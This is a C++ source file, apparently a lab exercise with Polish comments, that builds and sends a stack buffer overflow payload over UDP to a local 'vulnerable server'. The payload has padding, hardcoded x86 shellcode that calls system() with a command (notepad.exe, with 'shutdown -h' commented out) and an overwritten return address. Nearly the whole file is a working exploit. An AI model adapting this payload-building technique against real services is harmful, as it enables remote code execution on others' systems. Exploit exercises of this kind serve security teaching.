// Exploit01.cpp : Defines the entry point for the console application.
//
/*
wysy³ana ramka danych:
MD5$
<sysCallCmd>
<uzupe³nienie 'A' do pozycji numer 50>
<shellcode>
<uzupe³nienie 'A' do pozycji 248>
<adres pocz¹tku shellcode>
$


*/



#include "stdafx.h"
#include "winsock2.h"
#include "time.h"
#include <iostream>

using namespace std;

#define VULNERABLE_SERVER_PORT	1234

struct sockaddr_in serverAddr; 
int s;

int InitWSA();
int SocketInitialization();

char exploit[1024];

char shellcode[] = { 0xbc, 0xa8, 0xf3, 0x19, 0x00,	// mov esp, 0x0019f3a8
					 0x68, 0x28, 0xf4, 0x19, 0x00,	// push 0x0019f428
					 0xbb, 0x78, 0x9f, 0x44, 0x00,	// mov ebx, _system(0x00449F78)
					 0xff, 0xd3 };					// call ebx

auto sysCallCmd = "notepad.exe hello.BSS19Z";
//auto sysCallCmd = "shutdown -h";

int main(int argc, char* argv[])
{
 int result;
 int randomNumber;
 char buffer[1024];
 UINT (*func)(char*,UINT);
 HANDLE handle;
 char* pointer;

 InitWSA();
 
 s=SocketInitialization();

 // przygotuj dane
 int n = 0;

 // odwo³anie do podatnej funkcji
 exploit[n++] = 'M'; 
 exploit[n++] = 'D'; 
 exploit[n++] = '5'; 
 exploit[n++] = '$';

 // argumenty wywo³ania systemowego
 for (auto pointer = &sysCallCmd[0]; *pointer; pointer++)
	 exploit[n++] = *pointer;
 exploit[n++] = 0;

 // odstêp pomiêdzy danymi, a shellcode
 for (; n < 50; n++)
	 exploit[n] = 'A';
 
 // shellcode - wywo³anie systemowe z argumentem
 for (auto k = 0; k < sizeof(shellcode) / sizeof(*shellcode); k++)
	 exploit[n++] = shellcode[k];

 // uzupe³nienie payloadu do wymaganej d³ugoœci
 for (; n < 248; n++)
	exploit[n] = 'A';
 
 // adres powrotu z podatnej funkcji
 printf("return address starts at n=%d\n\r", n);
 // pokazanie próby wykonania kodu z adresu 0x12345678
 //exploit[n++] = 0x78; exploit[n++] = 0x56; exploit[n++] = 0x34; exploit[n++] = 0x12;

 // skok do wykonania przes³anego kodu
 exploit[n++] = 0x56; exploit[n++] = 0xf4; exploit[n++] = 0x19; exploit[n++] = 0x00;

 // znak koñcz¹cy wiadomoœæ
 exploit[n++] = '$';
 exploit[n] = 0;

 printf("sending %d bytes of data\n\r", n + 1);
  //wyœlij dane ...
 result = sendto(s, exploit, n + 1, 0, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
 //result=sendto(s,exploit02,sizeof(exploit02),0,(SOCKADDR*)&serverAddr,sizeof(serverAddr));

 // ... i zobacz co otrzyma³eœ w odpowiedzi
 result=recv(s,buffer,sizeof(buffer),0);

 printf("%s\n",buffer);

 return 0;
}

int InitWSA()
{
 int err,winsock_version;
 WSADATA winsock_data;

 winsock_version = MAKEWORD (2, 2);
 err = WSAStartup (winsock_version, &winsock_data);
 if (err != 0)
    return -1;
 return 0;
}

int SocketInitialization()
{
 struct sockaddr_in clientAddr; 
 int s,length;
 int result;

 memset((char*)&clientAddr,0,sizeof(clientAddr));
 clientAddr.sin_family=AF_INET;
 clientAddr.sin_addr.s_addr=INADDR_ANY;
 clientAddr.sin_port=htons(0); 

 memset((char*)&serverAddr,0,sizeof(serverAddr));
 serverAddr.sin_family=AF_INET;
 serverAddr.sin_addr.s_addr=inet_addr("127.0.0.1");
 serverAddr.sin_port=htons(VULNERABLE_SERVER_PORT);

 s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
 
 if (s<0)
	{
     printf("Socket creating failed\n");
     return -1;
   }

   if(bind(s,(LPSOCKADDR)&clientAddr,sizeof(struct sockaddr_in))<0)
	{
     printf("Bind failed\n");
     return -1;
   }

 return s;
}